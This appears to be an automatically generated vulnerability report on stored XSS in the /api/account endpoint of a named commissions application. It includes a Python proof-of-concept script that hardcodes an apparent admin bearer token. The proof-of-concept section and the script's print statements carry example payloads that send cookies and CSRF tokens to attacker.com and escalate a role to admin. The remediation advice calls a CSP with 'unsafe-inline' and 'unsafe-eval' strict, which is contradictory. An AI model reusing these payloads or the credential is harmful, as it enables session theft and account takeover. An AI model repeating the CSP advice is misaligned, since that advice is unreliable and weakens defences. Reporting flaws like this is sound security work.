# Stored XSS Vulnerabilities in User Authorities Allow Account Takeover

**ID:** vuln-0043
**Severity:** CRITICAL
**Found:** 2026-02-26 19:34:56 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/account
**Method:** GET
**CWE:** CWE-79
**CVSS:** 9.0

## Description

Multiple stored Cross-Site Scripting (XSS) vulnerabilities were discovered in the user authorities field of the application. The application stores and renders user authorities without proper sanitization, allowing malicious JavaScript payloads to be executed in the context of authenticated users.

The vulnerabilities were identified in the `all_authorities` field returned by the `/api/account` endpoint, which contains several XSS payloads that are rendered in the application frontend.

## Impact

Successful exploitation of these XSS vulnerabilities could allow an attacker to:

1. **Session Hijacking**: Steal authentication tokens and session cookies from authenticated users
2. **Account Takeover**: Perform actions on behalf of authenticated users, including Admin users
3. **Privilege Escalation**: Gain administrative privileges by manipulating user roles
4. **Data Exfiltration**: Access and exfiltrate sensitive commission data, user information, and financial records
5. **Malware Distribution**: Distribute malware to application users through the trusted application interface

The impact is particularly severe as these payloads are stored in the user authorities field, which is displayed to all users with access to user management functionality.

## Technical Analysis

The vulnerabilities exist in the user authorities management functionality. When a user's authorities are retrieved via the `/api/account` endpoint, the `all_authorities` field contains several unsanitized XSS payloads:

1. **Reflected Payload**: `suma\" onmouseover=alert(1) \"`
2. **HTML Injection**: `<a href=\"https://www.sumasoft.com/\">CLICK ME</a>`
3. **Event Handler**: `<img src=x onmouseover=alert(1)>`

These payloads are stored in the database and returned in the API response without proper encoding or sanitization. When rendered in the frontend application, these payloads execute in the context of authenticated users.

The root cause appears to be:
1. Lack of input validation when storing user authorities
2. Lack of output encoding when rendering authorities in the frontend
3. Insufficient Content Security Policy (CSP) to prevent XSS execution

## Proof of Concept

To reproduce the vulnerabilities:

1. **Authentication**: Log in as any user with access to user management functionality
2. **Trigger Payload**: Navigate to any page that displays user authorities (e.g., user profile, user management)
3. **Execution**: Hover over or interact with the user authorities section

The XSS payloads will execute automatically when rendered in the application frontend. The specific payloads found include:

1. Mouseover event: `onmouseover=alert(1)`
2. Malicious link: `<a href="https://www.sumasoft.com/">CLICK ME</a>`
3. Image with event handler: `<img src=x onmouseover=alert(1)>`

For a more impactful demonstration, an attacker could replace these payloads with:
- Session token exfiltration: `fetch('https://attacker.com/steal?cookie='+document.cookie)`
- CSRF token theft: `fetch('https://attacker.com/steal?csrf='+document.querySelector('[name=csrf]').value)`
- Privilege escalation: `fetch('/api/users', {method: 'POST', body: JSON.stringify({role: 'ROLE_ADMIN'})})`

```
import requests
import json

# Demonstrate the XSS vulnerability by showing the stored payloads
BASE_URL = "https://commissionstest.callippus.in"
AUTH_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWRtaW4iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6InVzZXItMiIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvZ3JvdXBzaWQiOiJBZG1pbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3NwbiI6IjAiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJhZG1pbkBsb2NhbGhvc3QiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9wb3N0YWxjb2RlIjoiMCIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3N0YXRlb3Byb3ZpbmNlIjoiQ2FsbGlwcHVzIiwiYWNjZXNzIjoiW1wiUk9MRV9BRE1JTlwiXSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl05L2NsYWltcy9yb2xlIjoiUk9MRV9BRE1JTiIsImV4cCI6MTc3MjE3NTA3NCwiaXNzIjoiaHR0cDovL2NhbGxpcHB1cy5jby51ayIsImF1ZCI6Imh0dHA6Ly9jYWxsaXBwdXMuY28udWsifQ.ubQv620wBIt0ECLfYF074HvGLPHpALU_1ZDtSbZBL7k"

HEADERS = {
    "Authorization": f"Bearer {AUTH_TOKEN}",
    "Content-Type": "application/json"
}

def demonstrate_xss_vulnerability():
    """Demonstrate the stored XSS vulnerability by retrieving the malicious payloads"""

    print("=== Demonstrating Stored XSS Vulnerability ===")

    # Get account information to retrieve the stored XSS payloads
    account_url = f"{BASE_URL}/api/account"
    response = requests.get(account_url, headers=HEADERS)

    if response.status_code == 200:
        account_data = response.json()
        print("Account data retrieved successfully")

        # Extract the malicious authorities
        authorities = account_data.get("all_authorities", [])
        print(f"Found {len(authorities)} authorities")

        # Identify the XSS payloads
        xss_payloads = []
        for auth in authorities:
            if "onmouseover" in auth.lower() or "<a href" in auth.lower() or "<img" in auth.lower():
                xss_payloads.append(auth)

        print(f"\n=== XSS Payloads Found ===")
        for i, payload in enumerate(xss_payloads, 1):
            print(f"{i}. {payload}")

        print(f"\n=== Impact Analysis ===")
        print("These payloads are stored in the database and will execute when:")
        print("1. Rendered in the application frontend")
        print("2. Viewed by any authenticated user")
        print("3. Interacted with (hover, click, etc.)")

        print(f"\n=== Exploitation Potential ===")
        print("An attacker could replace these payloads with more malicious ones:")
        print("1. Session token exfiltration: fetch('https://attacker.com/steal?cookie='+document.cookie)")
        print("2. CSRF token theft: fetch('https://attacker.com/steal?csrf='+document.querySelector('[name=csrf]').value)")
        print("3. Privilege escalation: fetch('/api/users', {method: 'POST', body: JSON.stringify({role: 'ROLE_ADMIN'})})")

        return True
    else:
        print(f"Failed to retrieve account data: {response.status_code}")
        print(f"Response: {response.text}")
        return False

if __name__ == "__main__":
    success = demonstrate_xss_vulnerability()
    if success:
        print("\n✓ XSS vulnerability confirmed - stored payloads found in user authorities")
    else:
        print("\n✗ Could not confirm XSS vulnerability")
```

## Remediation

To remediate these stored XSS vulnerabilities:

1. **Input Validation**:
   - Implement strict input validation for all user authorities
   - Reject any input containing HTML tags, JavaScript event handlers, or special characters
   - Use allowlists for valid authority values

2. **Output Encoding**:
   - Implement proper output encoding when rendering user authorities in the frontend
   - Use context-aware encoding (HTML, JavaScript, CSS, URL) based on where the data is rendered
   - Implement Content Security Policy (CSP) headers to prevent XSS execution

3. **Database Sanitization**:
   - Sanitize existing data in the database to remove malicious payloads
   - Implement a data cleansing process to remove XSS payloads from stored authorities

4. **Content Security Policy (CSP)**:
   - Implement a strict CSP header to prevent inline script execution
   - Example CSP: `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;`
   - Consider using nonce-based CSP for better security

5. **Frontend Framework Protections**:
   - Use modern frontend frameworks with built-in XSS protections (React, Angular, Vue)
   - Enable framework-specific XSS protection mechanisms
   - Use DOMPurify or similar libraries to sanitize HTML content

6. **Regular Security Testing**:
   - Implement regular security testing to identify and remediate XSS vulnerabilities
   - Use automated scanning tools and manual penetration testing
   - Implement secure coding practices and security awareness training

